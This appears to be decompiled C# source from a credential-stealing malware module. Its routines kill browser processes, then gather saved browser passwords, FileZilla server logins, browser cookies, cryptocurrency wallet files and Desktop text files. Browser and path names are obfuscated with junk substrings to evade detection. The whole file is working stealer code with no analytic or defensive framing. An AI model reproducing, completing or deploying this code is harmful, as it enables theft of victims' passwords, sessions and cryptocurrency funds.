using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Xml.Serialization;
using Decrypt;
using MainModule.Classes;
using Microsoft.Win32;

namespace Dodjins
{
	// Token: 0x02000026 RID: 38
	public static class Dominatroer
	{
		// Token: 0x060000D1 RID: 209 RVA: 0x000051B0 File Offset: 0x000033B0
		public static void KillAwerything()
		{
			string[] processNames = new string[]
			{
				"chrome",
				"browser",
				"firefox",
				"opera",
				"amigo",
				"kometa",
				"torch",
				"orbitum"
			};
			IEnumerable<Process> enumerable = from x in Process.GetProcesses()
			where processNames.Contains(x.ProcessName.ToLower())
			select x;
			foreach (Process process in enumerable)
			{
				try
				{
					bool flag = process.Handle != IntPtr.Zero;
					if (flag)
					{
						process.Kill();
						process.WaitForExit();
					}
				}
				catch
				{
				}
			}
		}

		// Token: 0x060000D2 RID: 210 RVA: 0x00005298 File Offset: 0x00003498
		public static List<string> FileMozl()
		{
			string basePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\Profiles";
			bool flag = Directory.Exists(basePath);
			List<string> result;
			if (flag)
			{
				DirectoryInfo directoryInfo = new DirectoryInfo(basePath);
				bool flag2 = directoryInfo != null;
				if (flag2)
				{
					result = (from x in directoryInfo.GetDirectories()
					select basePath + "\\" + x.ToString()).ToList<string>();
				}
				else
				{
					result = new List<string>();
				}
			}
			else
			{
				result = new List<string>();
			}
			return result;
		}

		// Token: 0x060000D3 RID: 211 RVA: 0x00005320 File Offset: 0x00003520
		public static List<string> CookMoz()
		{
			string basePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\Profiles";
			bool flag = Directory.Exists(basePath);
			List<string> result;
			if (flag)
			{
				DirectoryInfo directoryInfo = new DirectoryInfo(basePath);
				bool flag2 = directoryInfo != null;
				if (flag2)
				{
					result = (from x in directoryInfo.GetDirectories()
					select basePath + "\\" + x.ToString() + "\\cookies.sqlite").ToList<string>();
				}
				else
				{
					result = new List<string>();
				}
			}
			else
			{
				result = new List<string>();
			}
			return result;
		}

		// Token: 0x060000D4 RID: 212 RVA: 0x000053A8 File Offset: 0x000035A8
		public static Task<UserLog> StealPassword()
		{
			return Task.Factory.StartNew<UserLog>(delegate
			{
				UserLog result;
				try
				{
					List<qqqqqqqq> list = new List<qqqqqqqq>
					{
						new qqqqqqqq
						{
							BrowserName = "Chrfl2i93jk4ome".Replace("fl2i93jk4", string.Empty),
							FilePaths = new List<string>
							{
								Environment.GetEnvironmentVariable("LocalAppData") + "\\Googqwe123213le\\Chrome\\Userqwe123213 Data\\Default\\Login Data".Replace("qwe123213", string.Empty)
							}
						},
						new qqqqqqqq
						{
							BrowserName = "Yandep49812x".Replace("p49812", string.Empty),
							FilePaths = new List<string>
							{
								Environment.GetEnvironmentVariable("LocalAppData") + "\\Yandex\\YandexBrowser\\Uf123dsser Data\\Default\\Login Daf123dsta".Replace("f123ds", string.Empty)
							}
						},
						new qqqqqqqq
						{
							BrowserName = "Komqweq123eta".Replace("qweq123", string.Empty),
							FilePaths = new List<string>
							{
								Environment.GetEnvironmentVariable("LocalAppData") + "\\Kometa\\Useqqqwr Data\\Default\\Login Datqqqwa".Replace("qqqw", string.Empty)
							}
						},
						new qqqqqqqq
						{
							BrowserName = "Amiggg234o".Replace("gg234", string.Empty),
							FilePaths = new List<string>
							{
								Environment.GetEnvironmentVariable("LocalAppData") + "\\Amigo\\wg123User\\User Dawg123ta\\Default\\Login Dawg123ta".Replace("wg123", string.Empty)
							}
						},
						new qqqqqqqq
						{
							BrowserName = "Torchfqqqq".Replace("fqqqq", string.Empty),
							FilePaths = new List<string>
							{
								Environment.GetEnvironmentVariable("LocalAppData") + "\\Torchw1fdg123\\User w1fdg123Data\\Defaultw1fdg123\\Login Datw1fdg123a".Replace("w1fdg123", string.Empty)
							}
						},
						new qqqqqqqq
						{
							BrowserName = "hhh23Orbitum".Replace("hhh23", string.Empty),
							FilePaths = new List<string>
							{
								Environment.GetEnvironmentVariable("LocalAppData") + "\\Orbith52342234um\\User Dah52342234ta\\Default\\Login Dath52342234a".Replace("h52342234", string.Empty)
							}
						},
						new qqqqqqqq
						{
							BrowserName = "Opeuuff1ra".Replace("uuff1", string.Empty),
							FilePaths = new List<string>
							{
								Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Si5542oftware\\Opei5542ra Stable\\Login i5542Data".Replace("i5542", string.Empty)
							}
						},
						new qqqqqqqq
						{
							BrowserName = "Mojj311zilla".Replace("jj311", string.Empty),
							FilePaths = Dominatroer.FileMozl()
						}
					};
					UserLog userLog = new UserLog
					{
						Time = DateTime.Now,
						UserName = Environment.UserName,
						ListOfLogs = new List<PasswordContainer>()
					};
					Dominatroer.KillAwerything();
					foreach (qqqqqqqq qqqqqqqq in list)
					{
						PasswordContainer passwordContainer = new PasswordContainer
						{
							Name = qqqqqqqq.BrowserName,
							ListOfLogs = new List<Log>()
						};
						foreach (string text in qqqqqqqq.FilePaths)
						{
							try
							{
								bool flag = qqqqqqqq.BrowserName == "Mojj311zilla".Replace("jj311", string.Empty);
								if (flag)
								{
									passwordContainer.ListOfLogs.AddRange(new FireFox(text).GetPasswords());
									break;
								}
								bool flag2 = File.Exists(text);
								if (flag2)
								{
									passwordContainer.ListOfLogs.AddRange(new Chrome(text).GetPasswords());
								}
							}
							catch
							{
							}
						}
						userLog.ListOfLogs.Add(passwordContainer);
					}
					try
					{
						PasswordContainer passwordContainer2 = new PasswordContainer();
						passwordContainer2.Name = "FileZijj3qq211lla".Replace("jj3qq211", string.Empty);
						passwordContainer2.ListOfLogs = new List<Log>();
						try
						{
							bool flag3 = File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\FileZilla\\rrevcetecentservers.xml".Replace("revcet", string.Empty));
							if (flag3)
							{
								using (FileStream fileStream = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\FileZilla\\recentse666322rvers.xml".Replace("666322", string.Empty), FileMode.Open))
								{
									FileZilla3 fileZilla = (FileZilla3)Dominatroer.dbFormat.Deserialize(fileStream);
									PasswordContainer passwordContainer3 = passwordContainer2;
									passwordContainer3.Name = passwordContainer3.Name + " " + fileZilla.Version;
									foreach (Server server in fileZilla.RecentServers.Server)
									{
										Log item = new Log
										{
											Login = server.User,
											URL = server.Host + Environment.NewLine + "Портqqqq: ".Replace("qqqq", string.Empty) + server.Port,
											Password = server.Pass.Text + Environment.NewLine + "Метод ши5233фрования: ".Replace("5233", string.Empty) + server.Pass.Encoding
										};
										passwordContainer2.ListOfLogs.Add(item);
									}
								}
							}
						}
						catch (Exception ex)
						{
						}
						finally
						{
							userLog.ListOfLogs.Add(passwordContainer2);
						}
					}
					catch
					{
					}
					result = userLog;
				}
				catch
				{
					result = new UserLog();
				}
				return result;
			});
		}

		// Token: 0x060000D5 RID: 213 RVA: 0x000053E4 File Offset: 0x000035E4
		public static List<BitcoinWallet> sssq2()
		{
			List<BitcoinWallet> list = new List<BitcoinWallet>();
			try
			{
				bool flag = File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Litecoin\\wallet.dat");
				if (flag)
				{
					byte[] array = File.ReadAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Litecoin\\wallet.dat");
					bool flag2 = array != null;
					if (flag2)
					{
						list.Add(new BitcoinWallet
						{
							WalletArray = array,
							WalletName = "Litecoin",
							FileName = "wallet.dat"
						});
					}
				}
			}
			catch
			{
			}
			try
			{
				using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Bitcoin").OpenSubKey("Bitcoin-Qt"))
				{
					bool flag3 = File.Exists(registryKey.GetValue("strDataDir").ToString() + "\\wallet.dat");
					if (flag3)
					{
						byte[] array2 = File.ReadAllBytes(registryKey.GetValue("strDataDir").ToString() + "\\wallet.dat");
						bool flag4 = array2 != null;
						if (flag4)
						{
							list.Add(new BitcoinWallet
							{
								WalletArray = array2,
								WalletName = "Bitcoin-Qt",
								FileName = "wallet.dat"
							});
						}
					}
				}
			}
			catch
			{
			}
			try
			{
				bool flag5 = File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Bitcoin\\wallet.dat");
				if (flag5)
				{
					byte[] array3 = File.ReadAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Bitcoin\\wallet.dat");
					bool flag6 = array3 != null;
					if (flag6)
					{
						list.Add(new BitcoinWallet
						{
							WalletArray = array3,
							WalletName = "Bitcoin",
							FileName = "wallet.dat"
						});
					}
				}
			}
			catch
			{
			}
			try
			{
				foreach (FileInfo fileInfo in new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\bytecoin").GetFiles())
				{
					bool flag7 = fileInfo.Extension.Equals(".wallet");
					if (flag7)
					{
						byte[] array4 = File.ReadAllBytes(fileInfo.FullName);
						bool flag8 = array4 != null;
						if (flag8)
						{
							list.Add(new BitcoinWallet
							{
								WalletArray = array4,
								WalletName = "Bytecoin",
								FileName = fileInfo.Name
							});
						}
					}
				}
			}
			catch
			{
			}
			try
			{
				using (RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Dash").OpenSubKey("Dash-Qt"))
				{
					bool flag9 = File.Exists(registryKey2.GetValue("strDataDir").ToString() + "\\wallet.dat");
					if (flag9)
					{
						byte[] array5 = File.ReadAllBytes(registryKey2.GetValue("strDataDir").ToString() + "\\wallet.dat");
						bool flag10 = array5 != null;
						if (flag10)
						{
							list.Add(new BitcoinWallet
							{
								WalletArray = array5,
								WalletName = "Dash-Qt",
								FileName = "wallet.dat"
							});
						}
					}
				}
			}
			catch
			{
			}
			try
			{
				foreach (FileInfo fileInfo2 in new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Electrum\\wallets").GetFiles())
				{
					bool exists = fileInfo2.Exists;
					if (exists)
					{
						byte[] array6 = File.ReadAllBytes(fileInfo2.FullName);
						bool flag11 = array6 != null;
						if (flag11)
						{
							list.Add(new BitcoinWallet
							{
								WalletArray = array6,
								WalletName = "Electrum",
								FileName = fileInfo2.Name
							});
						}
					}
				}
			}
			catch
			{
			}
			try
			{
				foreach (FileInfo fileInfo3 in new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Ethereum\\wallets").GetFiles())
				{
					bool exists2 = fileInfo3.Exists;
					if (exists2)
					{
						byte[] array7 = File.ReadAllBytes(fileInfo3.FullName);
						bool flag12 = array7 != null;
						if (flag12)
						{
							list.Add(new BitcoinWallet
							{
								WalletArray = array7,
								WalletName = "Ethereum",
								FileName = fileInfo3.Name
							});
						}
					}
				}
			}
			catch
			{
			}
			try
			{
				using (RegistryKey registryKey3 = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Litecoin").OpenSubKey("Litecoin-Qt"))
				{
					bool flag13 = File.Exists(registryKey3.GetValue("strDataDir").ToString() + "\\wallet.dat");
					if (flag13)
					{
						byte[] array8 = File.ReadAllBytes(registryKey3.GetValue("strDataDir").ToString() + "\\wallet.dat");
						bool flag14 = array8 != null;
						if (flag14)
						{
							list.Add(new BitcoinWallet
							{
								WalletArray = array8,
								WalletName = "Litecoin-Qt",
								FileName = "wallet.dat"
							});
						}
					}
				}
			}
			catch
			{
			}
			try
			{
				using (RegistryKey registryKey4 = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("monero-project").OpenSubKey("monero-core"))
				{
					try
					{
						string text = registryKey4.GetValue("wallet_path").ToString().Replace("/", "\\");
						char[] separator = new char[]
						{
							'\\'
						};
						char[] separator2 = new char[]
						{
							'\\'
						};
						bool flag15 = File.Exists(text);
						if (flag15)
						{
							byte[] array9 = File.ReadAllBytes(text);
							bool flag16 = array9 != null;
							if (flag16)
							{
								list.Add(new BitcoinWallet
								{
									WalletArray = array9,
									WalletName = "Monero",
									FileName = text.Split(separator)[text.Split(separator2).Length - 1]
								});
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
			return list;
		}

		// Token: 0x060000D6 RID: 214 RVA: 0x00005A9C File Offset: 0x00003C9C
		public static Task<List<BrowserCookie>> cccokies()
		{
			return Task.Factory.StartNew<List<BrowserCookie>>(delegate
			{
				List<BrowserCookie> result;
				try
				{
					List<bbbrrooowser> list = new List<bbbrrooowser>
					{
						new bbbrrooowser
						{
							BrowserName = "Chrome",
							CookiePaths = new List<string>
							{
								Environment.GetEnvironmentVariable("LocalAppData") + "\\Google\\Chrome\\User Data\\Default\\Cookies"
							}
						},
						new bbbrrooowser
						{
							BrowserName = "Yandex",
							CookiePaths = new List<string>
							{
								Environment.GetEnvironmentVariable("LocalAppData") + "\\Yandex\\YandexBrowser\\User Data\\Default\\Cookies"
							}
						},
						new bbbrrooowser
						{
							BrowserName = "Kometa",
							CookiePaths = new List<string>
							{
								Environment.GetEnvironmentVariable("LocalAppData") + "\\Kometa\\User Data\\Default\\Cookies"
							}
						},
						new bbbrrooowser
						{
							BrowserName = "Amigo",
							CookiePaths = new List<string>
							{
								Environment.GetEnvironmentVariable("LocalAppData") + "\\Amigo\\User\\User Data\\Default\\Cookies"
							}
						},
						new bbbrrooowser
						{
							BrowserName = "Torch",
							CookiePaths = new List<string>
							{
								Environment.GetEnvironmentVariable("LocalAppData") + "\\Torch\\User Data\\Default\\Cookies"
							}
						},
						new bbbrrooowser
						{
							BrowserName = "Orbitum",
							CookiePaths = new List<string>
							{
								Environment.GetEnvironmentVariable("LocalAppData") + "\\Orbitum\\User Data\\Default\\Cookies"
							}
						},
						new bbbrrooowser
						{
							BrowserName = "Opera",
							CookiePaths = new List<string>
							{
								Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera Stable\\Cookies"
							}
						},
						new bbbrrooowser
						{
							BrowserName = "Mozilla",
							CookiePaths = Dominatroer.CookMoz()
						}
					};
					List<BrowserCookie> list2 = new List<BrowserCookie>();
					Dominatroer.KillAwerything();
					foreach (bbbrrooowser bbbrrooowser in list)
					{
						foreach (string text in bbbrrooowser.CookiePaths)
						{
							try
							{
								bool flag = File.Exists(text);
								if (flag)
								{
									List<string> list3 = new List<string>();
									bool flag2 = bbbrrooowser.BrowserName != "Mozilla";
									if (flag2)
									{
										eod91kk eod91kk = new eod91kk(text);
										list3 = eod91kk.Cookies().ToList<string>();
										bool flag3 = list3.Count != 0;
										if (flag3)
										{
											list2.Add(new BrowserCookie
											{
												FileName = "Cookie.txt",
												FileArray = Encoding.UTF8.GetBytes(string.Join(Environment.NewLine, list3)),
												Browser = bbbrrooowser.BrowserName
											});
										}
									}
									else
									{
										fdddddd fdddddd = new fdddddd(text);
										list3 = fdddddd.Cookies().ToList<string>();
										bool flag4 = list3.Count != 0;
										if (flag4)
										{
											string str = text.Split(new char[]
											{
												'\\'
											})[text.Split(new char[]
											{
												'\\'
											}).Count<string>() - 2];
											list2.Add(new BrowserCookie
											{
												FileName = str + "_Cookie.txt",
												FileArray = Encoding.UTF8.GetBytes(string.Join(Environment.NewLine, list3)),
												Browser = bbbrrooowser.BrowserName
											});
										}
									}
								}
							}
							catch
							{
							}
						}
					}
					result = list2;
				}
				catch
				{
					result = new List<BrowserCookie>();
				}
				return result;
			});
		}

		// Token: 0x1700000C RID: 12
		// (get) Token: 0x060000D7 RID: 215 RVA: 0x00005AD8 File Offset: 0x00003CD8
		public static IList<FileInfo> ttexxxt
		{
			get
			{
				return (from f in Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "*.txt", SearchOption.TopDirectoryOnly)
				select new FileInfo(f) into x
				where x.Length <= 2097152L
				select x).ToList<FileInfo>();
			}
		}

		// Token: 0x04000076 RID: 118
		public static XmlSerializer dbFormat = new XmlSerializer(typeof(FileZilla3));
	}
}
